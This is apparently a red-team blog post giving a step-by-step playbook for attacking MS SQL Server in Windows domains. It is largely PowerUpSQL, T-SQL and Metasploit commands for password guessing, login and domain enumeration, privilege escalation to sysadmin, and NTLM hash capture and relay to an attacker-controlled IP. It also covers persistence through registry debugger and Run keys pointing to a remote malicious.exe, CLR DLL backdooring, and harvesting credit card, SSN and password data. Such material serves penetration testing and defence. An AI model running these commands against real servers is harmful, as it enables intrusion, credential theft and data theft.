---
layout: single
title: Red Teaming MS SQL Server
date: 2020-06-14
classes: wide
tags:
  - Red Team
---

## Introduction 

MS SQL Server integrates right out the box with Windows and Active Directory Domains. Consequently, there are trust relationships wich we can leverage from an attacker perspective.  

## MS SQL Server Fundamentals  

MS SQL Server is a set of Windows services that run on the OS in the context of the service account. Every time an instance of SQL Server is installed, a set of Windows services is actually veing installed and uniquely named. High level of existing SQL Server account types:  
  - Windows Accounts.  
  - SQL Server Logins (Inside SQL Server).  
  - Database Users(Inside SQL Server).  

Windows accounts and SQL Server logins are used for signing into the SQL Server. Unless you are a sysadmin, an SQL Server login has to ve mapped to a database user in order to access data. A database user is created separately within the database level.   

MS SQL Server common roles are:  

  - Sysadmin role --> Windows Admin for SQL Server.  
  - public role --> Least privilege, something like Everyone group in Windows.  
  - [Full list](https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017).  

## Locating & Accessing SQL Servers.  

### Unauthenticated perspective.  

Tools to identify MS SQL Servers:  

  - [OSQL](https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017).  
  - [SQLPing3](http://www.sqlsecurity.com/downloads).  
  - [sqlcmd Utility](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017).  
    - ```sqlcmd -L``` --> Identify MS SQL Servers.  
  - [PowerUPSQL](https://github.com/NetSPI/PowerUpSQL).  
    - ```import-module .\PowerUPSQL.psd1``` --> Load Module.  
    - ```Get-SQLInstanceScanUDP``` --> Identify MS SQL Servers.  
  - Metasploit mssql_ping Module.  
  - Nmap, Nessus...  

AZURE:  
  - Databases residing in Azure environments can be located using a DNS dictionary attack, usually against the format *x.databases.windows.net*.  
  - Look for configuration files containing connection strings on public repositories.  
  - By default they're behind firewalls, however is a common practice for organisations to open up ports.  

### The Local User Perspective

As a local user SQL Server instances can be identified by checking system services and registry settings. PowerUpSQL includes a function to quickly identify local instances.  

  - ```import-module .\PowerUpSQL.psda1``` --> Load Module.  
  - ```Get-SQLInstanceLocal``` --> Identify local instances.  

### The Domain User Perspective 

SQL Server installed inside a domain are automatically registered in Active Directory with an associated service account in order to support Kerberos Authentication. Instances can be identified using:  

  - [setspn.exe](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx).  
  - [adfind.exe](http://www.joeware.net/freetools/tools/adfind/index.htm).  
  - [Get-Spn.psm1](https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1).  
  - [PowerUPSQL](https://github.com/NetSPI/PowerUpSQL).  
    - ```import-module .\PowerUPSQL.psd1``` --> Load Module.  
    - ```Get-SQLInstanceDomain``` --> Identify Instances.  

## Escalating Privileges within SQL Server.  

### Gaining Initial Foothold

Dictionary Attacks can be performed with commonly used credentials, be ware of account lockouts. **NOT OPSEC SAFE**.  

  - ```import-module .\PowerUPSQL.psd1``` --> Load Module. 
  - ```Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw``` --> Start the attack from unauthenticated user perspective.
  - ```Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw``` --> Start the attack from domain user perspective.  
  - ```Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username <USERNAME> -Password <PASSWORD>``` --> Manually connect to identified SQL Server instances.  

Many applications with SQL Server Express as backend are configured using specific credentials and instance names due to vendor recommendations. Check these credentials using:  
  - ```import-module .\PowerUPSQL.psd1``` --> Load Module.  
  - ```Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw```.  
  - ```Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw```.  

If communications with the MSSQL Server are unencrypted, we can perform MITM Attacks to inject our own queries. Depending on the Spoofed user privilege we can inject SQL Logins.  

  - [sqlmitm.py](https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b)

### Local or Domain User Perspective  

Try to login to SQL Servers with current account. Excessive login privileges are a common practice on enterprise network.  

  - ```import-module .\PowerUpSQL.psd1```.  
  - ```Get-SQLInstanceDomain | Get-SQLConnectionTest```.  
  - ```Get-SQLInstanceLocal | Get-SQLConnectionTest```.  
  - [PowerUpSQL Wiki](https://github.com/NetSPI/PowerUpSQL/wiki)  

### Public role --> Sysadmin Privileges.  

**1.Weak Paswords & Blind SQL Server Login Enumeration**  
If we attempt to list all SQL Server logins we will only see a subset of them. List all SQL Server logins:   

  - ```SELECT name FROM sys.syslogins```  
  - ```SELECT name FROM sys.server_principals```   

*suser_name* returns the principal name for a given principal id. SQL Logins can be identified by fuzzing the principal id value inside the *suser_name* function through the public role. Example Queries:  

  - ```SELECT SUSER_NAME(1)```  
  - ```SELECT SUSER_NAME(2)```  
  - ```SELECT SUSER_NAME(3)```   
  - ...  
  - Try weak passwords on those identified SQL Server Logins.  
  - ```Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName``` --> PowerUpSQL Blind SQL Login Enum.  

Blind domain account/objects enumeration can be performed with the public role. This attack is very useful in case of remote SQL injection Attack.  

  - ```SELECT DEFAULT_DOMAIN() as mydomain``` --> Get the domain where SQL Server is.  
  - ```SELECT SUSER_SID('<Identified_Domain>\Domain Admins')``` --> Full RID of Domain Admins group.  
  - Grab the first 48 bytes of the full RID to get domain's SID. 
  - Create a new RID (will be associated with a domain object) by appending a hex number value to the previous SID.  
  - ```SELECT SUSER_NAME(RID)``` --> Get the domain object name associated to the RID.  
  ```Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName``` --> PowerUpSQL Blind Domain Account Enum.  

**2.Impersonation**  
Most commonly used ways of getting execution in the context of a user that has more privileges on a SQL server are:  

  - *Impersonate privilege*.  
  - *Stored Procedure and Trigger Creation / Injection Issues*.  
  - *Automatic Execution of Stored Procedures*.  
  - Agent Jobs.  
  - xp_cmdshell proxy account.  
  - Create Database Link to File or Server.  
  - Import / Install Custom Assemblies.  
  - Ad-Hoc Queries.  
  - Shared Service Accounts.  
  - Database Links.  
  - UNC Path Injection.  
  - Python code execution.  

*A. Impersonate Privilege* 

There is a privilege/permission in the SQL Server which allows a less privileged user to impersonate another with more access. Queries/Commands o be executed are not limited BUT the database has to be configured as trustworthy for OS command executiont o be achieved.  

Manually check if you can impersonate sa login:  

  - ```SELECT SYSTEM_USER```   
  - ```SELECT IS_SRVROLEMEMBER('sysadmin')```   
  - ```EXECUTE AS LOGIN = 'sa'``` --> Database level, for server level use EXECUTE AS USER.  
  - ```SELECT SYSTEM_USER```  
  - ```SELECT IS_SRVROLEMEMBER('sysadmin')```  

*B. Stored Procedure and Trigger Creation/Injection Issues*  

A common error by developers is to gather all the functionallity they want to use, to be able to be execute in elevated context, and put it inside a stored procedure. Those stored procedures can be executed as the owner of the database (EXECUTE AS OWNER) to give it access to additional resources. This way, execution can still take place in another user's context, command can be limited and granting the impersonate privilege is not required. However, there are some disadvantages from a security perspective when following this approach:  

  - No granular control over database owner's privileges.  
  - *sa* account or sysadmin account usually owns the database.  

DB_OWNER role can use the EXECUTE AS OWNER to actually execute in the context of either the *sa* or sysadmin accounts. If those stored procedures are implemented insecurely, impersonation through SQL injection or command injection can occur, by actually extending the stored procedure. Example:  

  - ```USE MyDB```  
  - ```GO```  
  - ```CREATE PROCEDURE elevated```  
  - ```WITH EXECUTE AS OWNER```  
  - ```AS```  
  - ```EXEC sp_addsrvrolemember```  
  - ```'simple_user','sysadmin'```  
  - ```GO```  

The database has to be configured as trustworthy for OS command execution. Signed stored procedures is the correct way for them to be implemented, although impersonation through SQL or command injection can still occur.  

Attack Scenario:  

A DBA performs the following for a web application:   

  - ```CREATE LOGIN somebody WITH PASSWORD = 'P@ssw0rd123';``` --> Create SQL  Login for the WebApp.  
  - ```USE CurrentDB```  
  - ```ALTER LOGIN [somebody] with default database = [CurrentDB];```  
  - ```CREATE USER somebody FROM LOGIN [somebody];```  
  - ```EXEC sp_addrolemember [db_owner], [somebody];``` --> Assigns this SQL Login the db_owner role. Webapp can access whatever it needs from the database.  
  - ```ALTER DATABASE CurrentDB SET TRUSTWORTHY ON``` --> Sets the database as trustworthy for accessing external resources.  


You can identify such databases with the next query

  - ```SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME
		FROM sys.server_principals r
		INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id
		INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id 
		inner join sys.databases d on suser_sname(d.owner_sid) = p.name
		WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'```
		
Reconnaisance and explotation could be automated using the following metasploit modules

  - ```auxiliary/admin/mssql/mssql_escalate_dbowner```
  - ```auxiliary/admin/mssql/mssql_escalate_dbowner_sqi```
  - [more thorough investigation] (https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)


*C. Automatic execution of stored procedures*

all stored procedures configured to run as soon as the sql service restarts are execute as sa.

to check all the above mentioned issues you can use: 
  - invoke-SQLAudit function of powerUpSQL
  - invoke-SQLEscalatedPriv

We can also indirectly utilize the following to achieve the same:

**1. shared service Accounts**

If we compromise a single SQL server, we will have also compromised all SQL server using that shared account.

**2. Crawling database links**

Database links are essentially a persistent connection between two servers. 

Data links can be configurated in different ways, but more often we see them use hard-coded credentials.

Tools to automating crawling: 
  - [mssql_linkcrawler] (https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler)
  - [powerupsql] (https://blog.netspi.com/sql-server-link-crawling-powerupsql/)

**3.UNC path injection**

UNC are used to access remote file servers, following the format \\ip\file

If we can execute one of those functions, we can force the SQL server to authenticate to us and we can capture the sql service accounts NETNTLM password hash.

We can automate process with:

  - Get-SQLServiceAccountPwHashes script of PowerUpSQL
  - [Inveigh] (https://github.com/Kevin-Robertson/Inveigh)
  
  - Example sql NETNTLM hash:
	- ```import-module .\PowerUpSQL.ps1```
	- ```Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1```
	- ```Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-SQLServiceAccountPwHashes.ps1```
	- ```Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp attacker_controlled_ip```

  - Example smb NETNTLM hash using smbrelayx (impacket) and metasploit:  
	- ```python smbrelayx.py -h sqlserverIP -c 'powershell empire launcher'```  
	- ```msf > use auxiliary/admin/mssql/mssql_ntlm_stealer```
	- ```set SMBPROXY attackerIP```  
	- ```set RHOST webappwithsqliIP```  
	- ```set GET_PATH pathtosqli```  
	- ```run```  

## Common post-exploitation activities 

**1.Persistence**

All will be stored as SQL objects in the database and nothing will touch the disk

Example1:

  We could set up a debugger for utilman.exe, that will run cmd.exe when its called. Only sysadmins privileges.
  - ```import-module .\PowerUPSQL.psd1```
  - ```Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command 'c:\windows\system32\cmd.exe' -Instance 'SQLServerName\InstanceName'```
  
Example2:

  We could leverage CurrentVersion\run to establish persistence with xp_regwrite. Only sysadmins privileges.
  - ```import-module .\PowerUPSQL.psd1```
  - ```Get-SQLPersistentRegRun -Verbose -Name legit -Command '\\attacker_controlled_ip\malicious.exe' -Instance 'SQLServerName\InstanceName'```

Example3:

  We could also export all custom CLR assemblies to DLLs, backdor any of DLLs and finally import the backdoored CLR. Only sysadmins privileges.
  - ```import-module .\PowerUPSQL.psd1```
  - ```$Results = Get-SQLStoredProcedureCLR -Verbose -Instance 'SQLServerName\InstanceName' -UserName sa -Password 'password' -ExportFolder c:\temp```
  - ```Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe```

**2.Identifying sensitive data**

Regular expressions can certainly assist in filtering data and then identifying sensitive information.

Example1:

  - ```import-module .\PowerUPSQL.psd1```
  - ```Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword 'credit,ssn,password' -SampleSize 2 -ValidateCC -NoDefaults```

Example2:

	Transparent encryption
  - ```import-module .\PowerUPSQL.psd1```
  - ```Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults | Where-Object {$_.is_encrypted -eq 'TRUE'}| Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword 'card,password' -SampleSize 2 -ValidateCC -NoDefaults```
  
**3.Extracting  SQL Server login password hashes**

Using Get-SQLServerPasswordHash to extracting the SQL login passwords hashes

  - ```import-module .\PowerUPSQL.psd1```
  - ```Get-SQLServerPasswordHash -Verbose -Instance 'SQLServerName\InstanceName' -Migrate```

## Poisoning the SQL Server Resolution Protocol

We should be aware of the fact that the [SQL Server Resolution procotol](https://msdn.microsoft.com/en-us/library/cc219703.aspx) could be poisoned, forcing authentication to a server under our control.

  - [Responder](https://github.com/lgandx/Responder/pull/58)
  
# References:

  - [OSQL](https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017).  
  - [SQLPing3](http://www.sqlsecurity.com/downloads).  
  - [sqlcmd Utility](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017).
  - [setspn.exe](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx).  
  - [adfind.exe](http://www.joeware.net/freetools/tools/adfind/index.htm).  
  - [Get-Spn.psm1](https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1).
  - [sqlmitm.py](https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b)
  - [PowerUpSQL Wiki](https://github.com/NetSPI/PowerUpSQL/wiki). 
  - [RottenPotato](https://github.com/breenmachine/RottenPotatoNG)
  - [mssql_linkcrawler](https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler)
  - [powerupsql](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)
  - [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
  - [SQL Server Resolution procotol](https://msdn.microsoft.com/en-us/library/cc219703.aspx)
  - [Responder](https://github.com/lgandx/Responder/pull/58)
